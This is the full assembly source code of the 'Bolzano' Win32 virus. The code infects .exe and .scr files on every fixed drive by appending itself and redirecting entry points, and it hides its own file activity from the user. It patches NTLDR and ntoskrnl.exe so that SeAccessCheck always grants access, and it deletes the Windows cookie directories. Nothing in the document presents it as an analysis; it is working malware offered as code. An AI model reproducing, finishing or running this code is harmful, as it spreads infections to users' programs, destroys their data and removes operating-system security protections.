   ;
   ;          ---------------------------------------------------------
   ;
   ;                              --- BOLZANO ---
   ;
   ;          ---------------------------------------------------------
   ;
   ;
   ;
   ; TASM       /ml /zi BOLZANO
   ; TLINK32  -aa -r -v BOLZANO,,,\TASM\LIB\IMPORT32.LIB
   ;


   .386


   RADIX        16


   ASSUME       CS:HOST


   HOST         SEGMENT      'CODE'


                jmp          $


   EXTRN        Beep                                   ; at least one importation
                                                       ; is necessary to get a
                                                       ; reloc section
   HOST         ENDS


   ASSUME       CS:VIRUS


   VIRUS        SEGMENT      'DATA'


   X            equ          ebp - VS


   VS:

                db           68                        ; save host EntryPoint
   EntryPoint   dd           401000h

                pushad
                call         GetEIP

   OS_Test:

                mov          eax,[esp + 24]            ; kernel32 return address
                cmp          eax,80000000
                ja           short Win9x

   WinNT:

                mov          esi,offset WNT_GPA_Key - VS
                mov          edi,77F00000
                jmp          short Find_GPA

   Win9x:

                mov          esi,offset W9x_GPA_Key - VS
                mov          edi,0BFF70000

   Find_GPA:

                add          esi,ebp
                mov          [K32_Base + X],edi
                mov          edx,40000                 ; GPA search depth
                cld

   ScanKernel32:

                mov          ecx,08
                push         esi
                push         edi
                repz         cmpsb
                pop          edi
                pop          esi
                jz           short Found
                inc          edi
                dec          edx
                jz           ExitVS
                jmp          short ScanKernel32

   Found:

                add          edi,03
                mov          esi,offset Kernel32_API - VS
                add          esi,ebp

   GetAddresses:

                mov          eax,esi
                add          eax,07
                push         eax
                mov          eax,[K32_Base + X]
                push         eax
                call         edi                  ; edi points to GetProcAddress
                or           eax,eax
                jz           ExitVS
                mov          [esi + 01],eax

   NextFunction:

                lodsb
                or           al,al
                jnz          short NextFunction

                cmp          byte ptr [esi],0B8
                jz           short GetAddresses

   Initialize:

                call         GetTickCount
                mov          [RandNb + X],eax

                mov          eax,offset Buffer1 - VS
                add          eax,ebp
                mov          [B1A + X],eax              ; Buffer1 Address

                mov          eax,offset Buffer2 - VS
                add          eax,ebp
                mov          [B2A + X],eax              ; Buffer2 Address


   ; these 2 functions make this virus quite useful :)


                call         NukeNTSecurity

                call         NukeCookies


   ; now go on with the infection


                push         dword ptr [B1A + X]
                call         GetLocalTime

                mov          al,[Buffer1 + X + 2]       ; current month
                mov          [SelF + X],al              ; = self-infection mask

                mov          eax,offset ThreadID - VS   ; lpThreadID
                add          eax,ebp
                push         eax
                push         0                          ; dwCreationFlags
                push         ?                          ; lpParameter
                mov          eax,offset Reproduce - VS  ; lpStartAddress
                add          eax,ebp
                push         eax
                push         0                          ; dwStackSize
                push         0                          ; lpThreadAttributes
                call         CreateThread               ; launch viral thread

                mov          eax,offset FileTest - VS
                add          eax,ebp
                mov          [FT_Address + X],eax

                mov          eax,[esp + 24]             ; hook host thread
                mov          [BackToKernel + X],eax     ; kernel32 return address

                mov          eax,offset KillThread - VS ; so that the viral
                add          eax,ebp                    ; thread will terminate
                mov          [esp + 24],eax             ; at the same time as
                                                        ; the host program
   ExitVS:

                popad
                ret

   KillThread:

                db           0C6,05
   FT_Address   dd           ?                          ; stop search
                db           0C3                        ; with a ret

                db           68
   BackToKernel dd           ?

                ret


   ; the viral thread starts here


   Reproduce:


                push         ebp                     ; the Win9x kernel32 needs
                                                     ; a correct value in ebp
                call         GetEIP                  ; when the thread terminates

                call         GetCurrentThread        ; get our viral thread handle
                                                     ; in eax (usually -2)
                db           6A
   ThreadSpeed  db           +2
                push         eax
                call         SetThreadPriority

                mov          eax,offset CurrentDir - VS
                add          eax,ebp
                push         eax
                push         104
                call         GetCurrentDirectoryA

                mov          al,[CurrentDir + X]
                mov          [InitialDisk + X],al

                mov          eax,offset CurrentDir + 3 - VS
                add          eax,ebp
                mov          [CurDirEnd + X],eax

                call         InfectDisk              ; first infected the disk
                                                     ; where the virus started

   ; --------------

   ;            pop          ebp
   ;            ret                                  ; only for debug

   ; --------------

                mov          al,'Z'
                mov          [CurrentDir + X],al

   ScanDisks:                                        ; then scan from Z to C

                db           3C                      ; cmp al,InitialDisk
   InitialDisk  db           ?                       ; don't want to infect the
                jz           short AlreadyDone       ; same disk twice

                call         InfectDisk

   AlreadyDone:

                mov          al,[CurrentDir + X]
                dec          al
                mov          [CurrentDir + X],al

                cmp          al,'C'
                jnc          short ScanDisks

                pop          ebp
                ret

   InfectDisk:

                mov          eax,[B1A + X]
                mov          ebx,005C3A3F            ; '?:\',0
                mov          bl,[CurrentDir + X]
                mov          [eax],ebx
                push         eax
                call         GetDriveTypeA

                cmp          eax,01                  ; no drive
                jz           short SkipDisk

                cmp          eax,02                  ; floppy disk
                jz           short SkipDisk

                cmp          eax,05                  ; cd-rom
                jz           short SkipDisk

                call         StartSearch

   SkipDisk:

                ret

   StartSearch:                                      ; recursive search routine

                mov          eax,[CurDirEnd + X]
                mov          dword ptr [eax],002A2E2A  ; '*.*'

                push         dword ptr [B1A + X]
                mov          eax,offset CurrentDir - VS
                add          eax,ebp
                push         eax
                call         FindFirstFileA

                cmp          eax,-1
                jnz          short AccessOk
                ret

   AccessOk:

                mov          [SearchHandle + X],eax

   FileTest:

                mov          ebx,[B1A + X]

                cmp          byte ptr [ebx + 2C],2E
                jz           NextFile

                mov          eax,[ebx]                 ; al = file attributes
                test         al,10
                jz           short IsFileOk

                mov          esi,ebx
                add          esi,2C

                mov          edi,[CurDirEnd + X]
                push         edi

   AddDir:

                movsb
                cmp          byte ptr [esi],0
                jnz          short AddDir

                mov          al,'\'
                stosb

                mov          [CurDirEnd + X],edi

                push         dword ptr [SearchHandle + X]

                call         StartSearch

                pop          dword ptr [SearchHandle + X]

                pop          dword ptr [CurDirEnd + X]

                jmp          short NextFile

   IsFileOk:

                mov          esi,ebx
                add          esi,2C
                cld

   GetFileExtent:

                lodsb
                or           al,al
                jnz          short GetFileExtent

                mov          eax,[esi-4]
                or           eax,20202020


   ; if the host is a normal exe file, the thread priority
   ; will decrease, so that the user won't notice too much
   ; file access


                cmp          eax,' exe'                       ; .exe
                jnz          short isScr

                mov          byte ptr [ThreadSpeed + X],-2    ; Lowest Priority
                jmp          short Executable


   ; if the host is a screensaver, we will increase the
   ; thread priority, to infect the HD at full speed


   isScr:

                cmp          eax,' rcs'                       ; .scr
                jnz          short NextFile

                mov          byte ptr [ThreadSpeed + X],+2    ; Highest Priority

   Executable:

                cmp          dword ptr [ebx + 20],4000        ; minimum filesize
                jc           short NextFile

                mov          eax,offset FileTime - VS
                add          eax,ebp
                push         eax
                sub          eax,2                            ; FileDate
                push         eax
                mov          eax,offset Buffer1 + 4 - VS      ; CreationTime
                add          eax,ebp
                push         eax
                call         FileTimeToDosDateTime

                or           eax,eax
                jz           short NextFile

                mov          al,[FileTime + X]         ; self-infection test
                and          al,0F
                mov          cl,[FileDate + X]         ; program infected if :
                and          cl,0F                     ; CreationTime verifies
                xor          al,cl                     ;  (seconds and 0F)
                cmp          al,[SelF + X]             ; xor (days and 0F)
                jz           short NextFile            ; = mask

                call         InfectFile

   NextFile:

                push         dword ptr [B1A + X]
                push         dword ptr [SearchHandle + X]
                call         FindNextFileA

                or           eax,eax
                jnz          FileTest

   EndSearch:

                push         dword ptr [SearchHandle + X]
                call         FindClose
                ret


   InfectFile:

                mov          esi,offset CurrentDir - VS
                add          esi,ebp
                mov          edi,[B2A + X]
                mov          ecx,[CurDirEnd + X]
                sub          ecx,esi
                repz         movsb

                mov          esi,offset Buffer1 + 2C - VS
                add          esi,ebp

   GetFileName:

                movsb
                cmp          byte ptr [esi - 1],0
                jnz          short GetFileName

                push         02
                push         dword ptr [B2A + X]
                call         _lopen

                cmp          eax,-1
                jnz          short OpenOk
                ret

   OpenOk:

                mov          [FileHandle + X],eax

                mov          eax,offset Buffer2 - VS
                add          eax,ebp
                mov          [B2A + X],eax

                push         600
                push         eax
                push         dword ptr [FileHandle + X]
                call         _lread

   ; --------------

   ;            jmp          ExitInfect                ; only for debug

   ; --------------


                mov          ebx,[B2A + X]

                cmp          word ptr [ebx],'ZM'       ; DOS EXE
                jnz          ExitInfect

                cmp          word ptr [ebx + 18],0040  ; windows executable
                jc           ExitInfect

                cmp          word ptr [ebx + 3C],0300  ; make sure DOS header
                ja           ExitInfect                ; is not too big

                add          bx,[ebx+3C]               ; add PE Hedaer offset

                cmp          dword ptr [ebx],00004550  ; PE signature
                jnz          ExitInfect

                cmp          word ptr [ebx + 04],014C  ; 386
                jc           ExitInfect

                cmp          word ptr [ebx + 04],014F  ; Pentium
                ja           ExitInfect

                cmp          word ptr [ebx + 5C],2     ; don't infect native
                jnz          ExitInfect                ; subsystem programs
                                                       ; like ntoskrnl

                mov          eax,[ebx + 34]            ; ImageBase
                add          eax,[ebx + 28]            ; + EntryPoint
                mov          [EntryPoint + X],eax      ; = old EntryPoint

                xor          eax,eax
                mov          ax,[ebx + 06]        ;   number of sections
                dec          eax                  ; - 1
                mov          ecx,28               ; * 28h
                mul          ecx                  ; + Image Optional Header Size
                add          ax,[ebx + 14]        ;   & Image Data Directory
                add          eax,18               ; + Portable Executable Header Size
                add          eax,ebx              ; = last section offset
                mov          esi,eax

                mov          ecx,[esi + 0C]       ;   Section Address
                add          ecx,[esi + 10]       ; + Raw Data Size
                mov          [ebx + 28],ecx       ; = new EntryPoint

                or           dword ptr [eax + 24],80000000 ; must be writeable

                mov          ecx,[esi + 10]        ; Raw Data Size
                mov          [esi + 08],ecx        ; -> Section Size
                add          ecx,[esi + 14]        ; + Section Physical Offset
                mov          [VirusOffset + X],ecx ; = Virus Offset

                mov          eax,[B1A + X]
                mov          eax,[eax + 20]       ; file size
                sub          eax,2000             ; don't infect self-
                cmp          eax,ecx              ; extracting programs
                ja           short ExitInfect

                add          dword ptr ds:[esi + 08],RawVSize
                add          dword ptr ds:[esi + 10],RawVSize
                add          dword ptr ds:[ebx + 50],RawVSize  ; + 1000h

                push         00
                push         00
                push         dword ptr [FileHandle + X]
                call         _llseek

                push         600
                push         dword ptr [B2A + X]
                push         dword ptr [FileHandle + X]
                call         _lwrite                   ; now write header

                push         00
                db           68
   VirusOffset  dd           ?
                push         dword ptr [FileHandle + X]
                call         _llseek

                push         RawVSize
                push         ebp
                push         dword ptr [FileHandle + X]
                call         _lwrite                   ; write virus


   ExitInfect:                                    ; mark the program as infected

                mov          cl,[FileDate + X]    ; cl = days
                and          cl,0F
                xor          cl,[SelF + X]

                mov          al,[FileTime + X]    ; al = seconds
                and          al,0F0
                add          al,cl
                mov          [FileTime + X],al

                mov          eax,offset Buffer1 + 4 - VS         ; CreationTime
                add          eax,ebp
                push         eax
                mov          ax,[FileTime + X]
                push         eax
                mov          ax,[FileDate + X]
                push         eax
                call         DosDateTimeToFileTime

                mov          eax,offset Buffer1 + 14 - VS        ; LastWriteTime
                add          eax,ebp
                push         eax
                sub          eax,08                              ; LastAcessTime
                push         eax
                sub          eax,08                              ; CreationTime
                push         eax
                push         dword ptr [FileHandle + X]
                call         SetFileTime

                push         dword ptr [FileHandle + X]
                call         _lclose
                ret


   ;
   ; IMPORTANT : this function does a correct job under NT 4
   ; with sevice pack 3, but it might corrupt ntldr and
   ; ntoskrnl under windows 2000 (if they still exist)
   ;


   ; this patch can only be implemented in administrator mode


   NukeNTSecurity:


   ; every time NT starts, ntldr checks ntoskrnl to see
   ; if it hasn't been modified; if so, the system will halt.
   ; this protection must be removed, unless the ntoskrnl patch
   ; won't be accepted


                mov          eax,05
                push         eax
                mov          eax,offset NTPatch1 - VS
                add          eax,ebp
                push         eax
                mov          eax,offset NTSig1 - VS
                add          eax,ebp
                push         eax
                mov          eax,offset NTFile1 - VS
                add          eax,ebp
                push         eax
                call         PatchFile
                jc           short Failed


   ; SeAccessCheck returns 00 in al if permission is denied
   ; and 01 if permission is given. When the patch is installed,
   ; the function will automatically return 01. Therefore,
   ; evrey user will gain total control on the whole system.


                mov          eax,09
                push         eax
                mov          eax,offset NTPatch2 - VS
                add          eax,ebp
                push         eax
                mov          eax,offset NTSig2 - VS
                add          eax,ebp
                push         eax
                mov          eax,offset NTFile2 - VS
                add          eax,ebp
                push         eax
                call         PatchFile

   Failed:

                ret


   ;
   ; PatchFile( Filename, Signature, Patch, Signature Size )
   ;


   PatchFile:

                mov          eax,[B2A + X]
                push         eax

                sub          esp,4

                push         ebp
                mov          ebp,esp

                push         00
                push         dword ptr [ebp + 10]      ; Filename
                call         SetFileAttributesA

                push         02
                push         dword ptr [ebp + 10]
                call         _lopen

                cmp          eax,-1
                jz           short EOF2

                mov          [ebp + 4],eax

   ScanFile:

                push         400
                push         dword ptr [ebp + 8]       ; File Buffer Address
                push         dword ptr [ebp + 4]       ; FileHandle
                call         _lread

                cmp          eax,400
                jc           short EOF

                mov          esi,[ebp + 14]            ; Signature Address
                mov          edi,[ebp + 8]             ; File Buffer Address
                mov          edx,0400
                cld

   Find_Sig:

                mov          ecx,[ebp + 1C]            ; Signature Size
                push         esi
                push         edi
                repz         cmpsb
                pop          edi
                pop          esi
                jz           short Success
                inc          edi
                dec          edx
                jz           ScanFile
                jmp          short Find_Sig

   Success:

                mov          esi,[ebp + 18]            ; Patch Address
                mov          ecx,[ebp + 1C]            ; Signature Size
                repz         movsb

                push         01
                push         -400
                push         dword ptr [ebp + 4]       ; FileHandle
                call         _llseek

                push         400
                push         dword ptr [ebp + 8]       ; File Buffer Address
                push         dword ptr [ebp + 4]       ; FileHandle
                call         _lwrite

                push         dword ptr [ebp + 4]
                call         _lclose
                pop          ebp
                add          esp,8
                clc
                ret          10

   EOF:

                push         dword ptr [ebp + 4]
                call         _lclose

   EOF2:

                pop          ebp
                add          esp,8
                stc
                ret          10

   NukeCookies:

                mov          eax,offset Dir1 - VS      ; first, kill
                add          eax,ebp                   ; \WINDOWS\Cookies
                call         TrashDirectory

                mov          eax,offset Dir2 - VS      ; then, kill
                add          eax,ebp                   ; \WINNT\Cookies
                call         TrashDirectory
                ret


   TrashDirectory:


                push         dword ptr [B1A + X]
                push         eax
                call         FindFirstFileA

                cmp          eax,-1
                jnz          short Valid
                ret

   Valid:

                mov          [SearchHandle + X],eax

   CleanIt:

                mov          eax,[B1A + X]
                add          eax,2C
                push         eax
                call         DeleteFileA

                push         dword ptr [B1A + X]
                push         dword ptr [SearchHandle + X]
                call         FindNextFileA

                or           eax,eax
                jnz          CleanIt
                ret


   ; this fonction isn't used yet - but it will be useful for
   ; the polymorphic engine


   GetRandNb:

                mov          eax,dword ptr [RandNb + X]
                mul          dword ptr [RMul + X]
                div          dword ptr [RDiv + X]
                mov          eax,edx
                mov          dword ptr [RandNb + X],eax
                ret

   GetEIP:

                call         @1

   @1:
                pop          ebp
                sub          ebp,offset @1 - offset VS ; j'y tiens !

                ret



   ; At the moment, other API than the Kernel32 are not supported


   Kernel32_API:


   CreateThread:

                db           0B8
                dd           ?
                jmp          eax

                db           'CreateThread',0

   DeleteFileA:

                db           0B8
                dd           ?
                jmp          eax

                db           'DeleteFileA',0

   DosDateTimeToFileTime:

                db           0B8
                dd           ?
                jmp          eax

                db           'DosDateTimeToFileTime',0

   FindClose:

                db           0B8
                dd           ?
                jmp          eax

                db           'FindClose',0

   FindFirstFileA:

                db           0B8
                dd           ?
                jmp          eax

                db           'FindFirstFileA',0

   FindNextFileA:

                db           0B8
                dd           ?
                jmp          eax

                db           'FindNextFileA',0

   GetCurrentDirectoryA:

                db           0B8
                dd           ?
                jmp          eax

                db           'GetCurrentDirectoryA',0

   GetCurrentThread:

                db           0B8
                dd           ?
                jmp          eax

                db           'GetCurrentThread',0

   GetFileTime:

                db           0B8
                dd           ?
                jmp          eax

                db           'GetFileTime',0

   GetDriveTypeA:

                db           0B8
                dd           ?
                jmp          eax

                db           'GetDriveTypeA',0

   GetLocalTime:

                db           0B8
                dd           ?
                jmp          eax

                db           'GetLocalTime',0

   GetTickCount:


                db           0B8
                dd           ?
                jmp          eax

                db           'GetTickCount',0

   FileTimeToDosDateTime:


                db           0B8
                dd           ?
                jmp          eax

                db           'FileTimeToDosDateTime',0

   SetFileAttributesA:

                db           0B8
                dd           ?
                jmp          eax

                db           'SetFileAttributesA',0

   SetFileTime:

                db           0B8
                dd           ?
                jmp          eax

                db           'SetFileTime',0


   SetThreadPriority:

                db           0B8
                dd           ?
                jmp          eax

                db           'SetThreadPriority',0

   _lclose:

                db           0B8
                dd           ?
                jmp          eax

                db           '_lclose',0

   _llseek:

                db           0B8
                dd           ?
                jmp          eax

                db           '_llseek',0

   _lopen:

                db           0B8
                dd           ?
                jmp          eax

                db           '_lopen',0

   _lread:

                db           0B8
                dd           ?
                jmp          eax

                db           '_lread',0

   _lwrite:

                db           0B8
                dd           ?
                jmp          eax

                db           '_lwrite',0


   W9x_GPA_Key  db           0C2,04,00,57,6A,22,2Bh,0D2

   WNT_GPA_Key  db           0C2,04,00,55,8Bh,4C,24,0C

   NTFile1      db           '\NTLDR',0                      ; OS Loader

   NTFile2      db           '\WINNT\system32\ntoskrnl.exe',0

   NTSig1       db           3Bh,46,58,74,07

   NTSig2       db           8A,0C3,5F,5E,5Bh,5Dh,0C2,28,00  ; SeAccessCheck

   NTPatch1     db           3Bh,46,58,0EBh,07               ; replace jz by jmp

   NTPatch2     db           0B0,01,5F,5E,5Bh,5Dh,0C2,28,00  ; replace mov al,bl
                                                             ; by mov al,01
   Dir1         db           '\WINDOWS\Cookies\*.*',0

   Dir2         db           '\WINNT\Cookies\*.*',0

   RMul         dd           07FFFFD9h

   RDiv         dd           0FFFFFFFBh



   K32_Base     dd           ?

   RandNb       dd           ?

   ThreadID     dd           ?

   SearchHandle dd           ?

   CurDirEnd    dd           ?

   FileHandle   dd           ?

   FileDate     dw           ?

   FileTime     dw           ?

   SelF         db           ?

   B1A          dd           ?

   B2A          dd           ?



   CurrentDir   db           100 dup (1)

   Buffer1      db           80 dup (2)

   Buffer2      db           600 dup (3)


                db           '  BOLZANO  '


   VE:



   VSIZE        equ          offset VE - offset VS

   RawVSize     equ          VSIZE - (VSIZE mod 1000) + 1000


   VIRUS        ENDS


   END          VS
